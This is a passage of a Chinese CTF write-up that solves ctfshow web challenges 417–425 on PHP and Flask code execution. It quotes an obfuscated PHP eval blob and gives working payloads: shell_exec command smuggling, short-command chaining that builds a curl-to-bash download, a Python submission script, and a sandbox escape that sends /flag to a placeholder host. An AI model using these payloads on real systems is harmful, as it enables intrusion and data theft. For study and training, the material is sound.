class="variable">$cIYMfW</span>[<span class="number">24</span>] . <span class="variable">$cIYMfW</span>[<span class="number">10</span>] . <span class="variable">$cIYMfW</span>[<span class="number">24</span>];</span><br><span class="line"><span class="variable">$RkEEuV</span> = <span class="variable">$xWoIVy</span>[<span class="number">0</span>] . <span class="variable">$cIYMfW</span>[<span class="number">18</span>] . <span class="variable">$cIYMfW</span>[<span class="number">3</span>] . <span class="variable">$xWoIVy</span>[<span class="number">0</span>] . <span class="variable">$xWoIVy</span>[<span class="number">1</span>] . <span class="variable">$cIYMfW</span>[<span class="number">24</span>];</span><br><span class="line"><span class="variable">$YFfKrW</span> = <span class="variable">$cIYMfW</span>[<span class="number">7</span>] . <span class="variable">$cIYMfW</span>[<span class="number">13</span>];</span><br><span class="line"><span class="variable">$CBhSfw</span> .= <span class="variable">$cIYMfW</span>[<span class="number">22</span>] . <span class="variable">$cIYMfW</span>[<span class="number">36</span>] . <span class="variable">$cIYMfW</span>[<span class="number">29</span>] . <span class="variable">$cIYMfW</span>[<span class="number">26</span>] . <span class="variable">$cIYMfW</span>[<span class="number">30</span>] . <span class="variable">$cIYMfW</span>[<span class="number">32</span>] . <span class="variable">$cIYMfW</span>[<span class="number">35</span>] . <span class="variable">$cIYMfW</span>[<span class="number">26</span>] . <span class="variable">$cIYMfW</span>[<span class="number">30</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$CBhSfw</span>(<span class="string">&quot;JGpYanRLZD0ianBRRHVrYkd3eW5abWlWek1mc0pDb0hGTnJxSUJTaGRQQXhMT0tFZ1d0dlVUZVJYYVlsY1RjUkNadW5WbWpHVUtIZUlmT2RZWHNEa1NwTVFFaXR4TnJBbHphcXdQQmJKZ0Z2V295aExOQzltb0Ryd1VWZUtvUDVoYVh4YWl1dnRGaGZtZmdRMllqQXRKVmVsZWtybWZnUTJhZ2R1eWV2M1VHRWxOV2VqblZ2aHkyOXVVaXdIWWdVa2ZpSjNSaUoyZkhKanZISjJ2WEoyZmdKaFNKZmhTSXloU0lSbVlneTVmVHdoZnVSaFNJcmhTSXdoU0lKaFNJcWhTSXVoZnVxMllnVUNZZ0xqWWdVWFlneTBZZ3kzemlKMXZISjJTaUoyelhKMmZqSjNmakozU2pKMnZUUmhmdVFoU1R5SVNqSjJSaVFjemp2U0ozVVpnR3c5WVZrSngyVW1pMWRJV2k0dXlldjNVR0VsUElVeGxIdnRlRHhLTHFCbmZJU3hsSHZ0ZUR4S0xxQm5mSUV4emp2VG9rdkpGUGY5WVZrSngyVW1pMWRJZjEwWllWa0p4MlVtaTFkQWZrMFpZVmtKeDJVbWkxZGpTazBaWVZrSngyVW1pMWRBZmswWllWa0p4MlVtaTFkalNrMDdZREVYSkRrNHZUMHV5MnRKZURoVFBJRXhsSHZ0ZUR4S0xxQm5mZ3R4bEh2dGVEeEtMcUJuZjEwWllWU3Nla3Y1eTFkbVdpNHV5MnRKZURoVFBJa3hsSHZ0ZUR4S0xxQm5mVHZ4emp2Q2VHRUJlM1E5WVZrSngyVW1pMWQzV2k0dXlldjNVR0VsUElxSVdnZHVnZVMybnU1NGxUMHV5ZXYzVUdFbFBJUWpXaTR1eWV2M1VHRWxQSWYyV2k0dXlldjNVR0VsUElRNVdpNHV5ZXYzVUdFbFBJUTJXaTR1eWV2M1VHRWxQSWZtV2k0dXlldjNVR0VsUElmaldpNHV5ZXYzVUdFbFBJZjFXaTR1eWV2M1VHRWxQSVEyV2k0dXlldjNVR0VsUElmbVdnQmh4S2tkYVh2U0ozVVpnR3dzUXVjVm5EZWd2V0VCVURzbW9QZVBSdTFIZjA1QVVxZXVTa1VkVWtjV2lxWU15SlVQdmVKbW5xWWVvMDVOUEswQWllY1F2dVV1ZmhVY3l1dG9naGVQTERZdGVXdlJVUDVQUjFVRFVxQlRvMWNzeUsxMG9WU2RKaHR0blB3MXlJa21SaFNwU0pjUG5oWVJVSng0TGtTREpLNXZma2NRZUpKQXhlZUJmZXZUZWhVaVVreG9TaHhlRnFldW51WVZQaFVzb2hmbWlLaHVmVGhzVUp2ZHhWUkFSdWhVZnVVM2d1Um1vSjhqZVRZVWUzeGJpR3M0YTBjNVNWQkpldTRqeUtkMVNxQkNKS2N0dmhZZVVleFNuMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoQWdQaHBMMGNRUnVTZWlxeTBKS2hHbzF4V1NKaGduZXNJZ3FTaXZrVVpSR3ZQZjBoSWl1ZXplMlNEZmV0VG9QQklpdXRYUjFlUXZUdmlvUHhwZTFMMWllU0JQVFNmdnFrSWl1ZXplMlNEZmV0VG9QQm1pMVNwU2pRY2FnZC9OVG0vTFZ0bVFWdmhVS2haVWl3R0ZQdnRvMlUzZkNxalNITGR5ZUVoaTF2UmZDcWpTSHU3WXExc0ZreGhSVDExTEtBdVVQU2JVVkpzUUhKMnZncWhTMHFoU1RRaGZ1eWhTdVJoU1RxMVlnZUNZZ0wyWWdMMGZYSjJ6Z1E0WWdZcVlnTG1ZZ0w0WWdMMVlnTEFZZ0w1WWdZRVNISjJSakozZkhKMlJISjJTWEoyU0l1aFNKeWhTVEpoU1R3aFNUZmhTSWZoU0lMaFN1eTBZZ1lYWWd5MmZJTGhTdXFIYWdkdVUyMUhna3Z1Tml2U29EdFdVSlluZjEwWllxMXNGa3hoUmhkMldpNHVnUHQ0ZTJlWFBJZklXaTR1Z1B0NGUyZVhQSWZtV2dkdUZLZXFnVmNvTml2U29EdFdVSlluZklTeGxIdlNvRHRXVUpZbmZnRXhsSHZTb0R0V1VKWW5mVHZ4bEh2U29EdFdVSlluZmdFeGxIdlNvRHRXVUpZbmZUdnh6anZkaWVjREowdTlZRGNodnFBTVBoZG1XaTR1Z1B0NGUyZVhQSXE0V2k0dWdQdDRlMmVYUElTeGxIdjZVSnZmb2hjbmZrMFpZRGNodnFBTVBoZEFXaTR1Z1B0NGUyZVhQSVEwV2dkdXZHZUF5V2VvTml2U29EdFdVSlluUzEwWllxMXNGa3hoUmhkQWYxMDdZVnhCeXVBSlVYNDlZcTFzRmt4aFJoZGpmaDBaWXExc0ZreGhSaGRJU2gwWllxMXNGa3hoUmhkanplMFpZcTFzRmt4aFJoZGpTaDBaWXExc0ZreGhSaGRJZmswWllxMXNGa3hoUmhkSWZoMFpZcTFzRmt4aFJoZElTZTBaWXExc0ZreGhSaGRqU2gwWllxMXNGa3hoUmhkSWZrMDdVV1V0blh3dVUyMUhna3Z1YVhZYXZnZTN5aHhtaVBTSmZWaHZvMFUzZWVlNG9LZVBnSzVUbzNFMlB1ZWlma2hwVWtjdWYwNXNQS0FveWVlVmVoZUhvMWNJeWVVYUZWZXB4cXZIZTFVUnlKeG1Ta3hRZXU5dW8xVXl5Z0VzZ2hTUEp1dnRlSWtsVWV4b2Vra3lnaGt1dld2Z1BURXNpaGNQZWhjSHZ1eUlKSzVYZmV2V29rdEp2R0VNUHV0c1NLU2VpR1lUbmdoa0poSjFmaFJqaWh4SG5WdFF5UDFWeDFlTW5rVUh2UHZxZUNTVlJ1MVFMcUJvbmhZUnkxVW1MZWtlTGt2dXYydnNKMUo1b2VZcG5xMXVvMXMwVXFlVmdrdkJndVNnb0lrWEplZW1lVnZEVWtTSFBrWWtQZVVvZWVVa3hxOVVmMVlZZ2dZa2ZoaGVucVlpZTN2YWVLZDVGa3hCTHFZSGVoY015VEUwaUt2SlBLdFRlSjVYeVBCaXZrY0JMa3ZTdmhVQWVXY1huZVJBZ3V2b25XcjBVcVVQSlZlUUpLMXRuZ0UzVVAxVm5lVWtndTVnZUtSMEpJU1ZlZVJtVTNoVWZLQURKUEI0Z2VZWnZoZVduV3Z6VXFlVm9WU1BKVEV0b0llMnlUa2F4VnZrSkt0UG5rWUFQaEoxSnExRHZoeFNlMGNESjFlNFIyWURTZ1NXdjBVUVBnWWRpUFlaZWdZVWV1Y3NlaHhtdmVVQlVEa2Vua2NaeVBCaW5ra1dMcWV2RmhjUmVreGtmS2twSkdrSmYwVXR5UEJWeGtTeVVWNW9lSWVTZTF0YXllVVFKR2tKbmdoMnloZWRKcTFrUHVTdWZoY2xKUGQ1b2VTRGZEeGhuSlVCZXVlemllU2VGQ1lIaVZ3bUpleDRpa2g2UlRlaWZLOGpKMjFVU2VZa3hxY2lvM3cxZTJjUHZlU3FpV3hKZjBVWGdKdG1TaHhNb2tFVGVKc0lQSzVkUjA5V1B1OVNmSllTVWVlcFNlY3B4cWNKaWtjRFBLQlZlS2VwZmVjSmYwVUNlcXRvbnExcGVXdGlvMm1BVXFVRUZlWWRuVkFIbkttalVlZWR4aFVQUksxV3ZWdmd5aHRpUGVjeVUzeFd2Z3YzSklrdWYxeUFuVjlvZXE1TUpQQUVGcTFxVWtTSGUyQW1KS0FtUmh4RGVUdlN2VkF2Z2dyNWZrU3FnVGV0aURFTmUxSjVGa2tlRnExb2VxYzJQUDFWRmt1bWl1aGdlS3ZieTJBZXgyZWR2R2V1ZlBtMWdQNVRmMWVCZmdFZXZlYzFlQ1NpaWVjcGdLOVVmUHRWZXV4U0ZxOXlpdTVTZTA1aWVna29mMUpqZ2h2aGVWdmd5aHhwU0poTXhWQXVuSlVJaTBTVGwxRWN5M2VhdjJ2MFBQQjRlZWNDVTJCaG5lVWtlcXhteUpCQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRpMmNZTHFBQ0pHU2dlR0VRZWdFcG4wY2tTV3hIZTNFWXkxUzNvMVlaZUd0VVBrVXRncVNpdjJ2eXZLdHVlSzltZ3FTaUwxU1BMcXRlZlZCYml1SjF4MllXTHFoVEozeDNncVNpdjJ2eXZLdHVlSzltaTFTcExxOTNOZzBIYWl1N05JND0iO2V2YWwoJz8+Jy4kQ0JoU2Z3KCR4V29JVnkoJFJrRUV1VigkalhqdEtkLCRZRmZLclcqMiksJFJrRUV1VigkalhqdEtkLCRZRmZLclcsJFlGZktyVyksJFJrRUV1VigkalhqdEtkLDAsJFlGZktyVykpKSk7&quot;</span>)); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>调试一下</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$c</span>==<span class="string">&#x27;show&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="web418"><a href="#web418" class="headerlink" title="web418"></a>web418</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-26 23:52:58</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$key</span>= <span class="number">0</span>;</span><br><span class="line"><span class="variable">$clear</span>=<span class="string">&#x27;clear.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取参数</span></span><br><span class="line"><span class="variable">$ctfshow</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfshow&#x27;</span>];</span><br><span class="line"><span class="comment">//包含清理脚本</span></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$clear</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$key</span>===<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="comment">//帮黑阔写好后门</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;&lt;?php &#x27;</span>.<span class="variable">$ctfshow</span>.<span class="string">&#x27;?&gt;&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$die</span>?<span class="keyword">die</span>(<span class="string">&#x27;FLAG_NOT_HERE&#x27;</span>):<span class="title function_ invoke__">clear</span>(<span class="variable">$clear</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"><span class="variable">$log</span></span>)</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;rm -rf &#x27;</span>.<span class="variable">$log</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Notice: Undefined index: ctfshow in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">18</span></span><br><span class="line">FLAG_NOT_HERE</span><br></pre></td></tr></table></figure>

<p>注意代码</p>
<p>给的后门没法用，需要变量覆盖然后利用shell_exec</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">die</span>=<span class="number">0</span>&amp;clear=;cp flag.php flag.txt</span><br></pre></td></tr></table></figure>

<p>然后访问flag.txt即可</p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415141929631.png" alt="image-20220415141929631"></p>
<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415141935770.png" alt="image-20220415141935770"></p>
<h1 id="web419"><a href="#web419" class="headerlink" title="web419"></a>web419</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-29 01:36:24</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">17</span>)&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: code in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">18</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=`cp f* f.txt`;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415142122553.png" alt="image-20220415142122553"></p>
<h1 id="web420"><a href="#web420" class="headerlink" title="web420"></a>web420</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-29 01:41:05</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">8</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: code in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">18</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">system</span>(): Cannot execute a blank command in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">20</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ls找了几个目录发现在&#x2F;var&#x2F;www下（ls …&#x2F;）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=nl ..<span class="comment">/*</span></span><br></pre></td></tr></table></figure>

<p>还有一种方法，可以参考下大佬写的<a target="_blank" rel="noopener" href="https://www.cnblogs.com/-chenxs/p/11981586.html">文章</a><br> 比如我们想执行 cat index.php,可以依次执行如下命令</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&gt;php\\</span><br><span class="line">&gt;dex.\\</span><br><span class="line">&gt;\ in\\</span><br><span class="line">&gt;cat\\</span><br></pre></td></tr></table></figure>

<p>接着执行ls -t &gt;0<br> 这样的话文件0中的内容就是 cat index.php<br> 最后利用sh 0 来执行就可以了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">payload = [</span><br><span class="line">    <span class="string">&#x27;&gt;sh &#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;ba\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;\|\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;2\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;2x\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;xxx.\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;9x.\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;1\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;2.\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;4\\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;\ \\&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;&gt;curl\\&#x27;</span>,</span><br><span class="line">    <span class="comment"># &#x27;&gt;cu\\&#x27;,</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in payload:</span><br><span class="line">    <span class="comment"># assert len(i) &lt;= 8</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;code&#x27;</span>: <span class="title function_ invoke__">str</span>(i)</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;http://6171141f-4d7c-447c-b0f6-1c92f0abd9be.chall.ctf.show/&#x27;</span>, data=data)</span><br><span class="line">    <span class="keyword">print</span>(i)</span><br><span class="line">    time.<span class="title function_ invoke__">sleep</span>(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="web421"><a href="#web421" class="headerlink" title="web421"></a>web421</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-29 01:42:50</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">6</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: code in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">18</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">system</span>(): Cannot execute a blank command in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">20</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=nl *</span><br></pre></td></tr></table></figure>

<h1 id="web422"><a href="#web422" class="headerlink" title="web422"></a>web422</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-01-25 23:07:21</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-01-29 01:42:50</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &lt; <span class="number">5</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Notice: Undefined index: code in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">18</span></span><br><span class="line"></span><br><span class="line">Warning: <span class="title function_ invoke__">system</span>(): Cannot execute a blank command in /<span class="keyword">var</span>/www/html/index.php on line <span class="number">20</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">code=nl *</span><br></pre></td></tr></table></figure>

<h1 id="we4b23"><a href="#we4b23" class="headerlink" title="we4b23"></a>we4b23</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415143111800.png" alt="image-20220415143111800"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span class="keyword">from</span> flask import request</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">app_index</span>():</span><br><span class="line">    code = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    	<span class="keyword">return</span> <span class="keyword">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">str</span>(<span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].<span class="title function_ invoke__">__subclasses__</span>()[<span class="number">185</span>].__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;__imp&#x27;</span>+<span class="string">&#x27;ort__&#x27;</span>](<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).__dict__[<span class="string">&#x27;pop&#x27;</span>+<span class="string">&#x27;en&#x27;</span>](<span class="string">&#x27;curl http://xx.xx.xx.xx?1=`cat /flag`&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>下面的题都是python的命令执行的，因为下面代码中的return需要返回的是字符串，所以不是字符串的我们就用str函数转换一下就好了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=os.popen(&#x27;ls /&#x27;).read()</span><br><span class="line">?code=os.popen(&#x27;cat /flag&#x27;).read()</span><br></pre></td></tr></table></figure>

<h1 id="web424"><a href="#web424" class="headerlink" title="web424"></a>web424</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span class="keyword">from</span> flask import request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">app_index</span>():</span><br><span class="line">    code = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    	<span class="keyword">return</span> <span class="keyword">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?code=open(&#x27;/flag&#x27;).read()</span><br></pre></td></tr></table></figure>

<h1 id="web425"><a href="#web425" class="headerlink" title="web425"></a>web425</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask import Flask</span><br><span class="line"><span class="keyword">from</span> flask import request</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = <span class="title function_ invoke__">Flask</span>(__name__)</span><br><span class="line">@app.<span class="title function_ invoke__">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_ invoke__">app_index</span>():</span><br><span class="line">    code = request.args.<span class="title function_ invoke__">get</span>(<span class="string">&#x27;code&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> code:</span><br><span class="line">    	<span class="keyword">if</span> <span class="string">&#x27;os&#x27;</span> not in code:</span><br><span class="line">    		<span class="keyword">return</span> <span class="keyword">eval</span>(code)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;where is flag?&lt;!-- /?code --&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.<span class="title function_ invoke__">run</span>(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">open</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_ invoke__">read</span>()</span><br></pre></td></tr></table></figure>

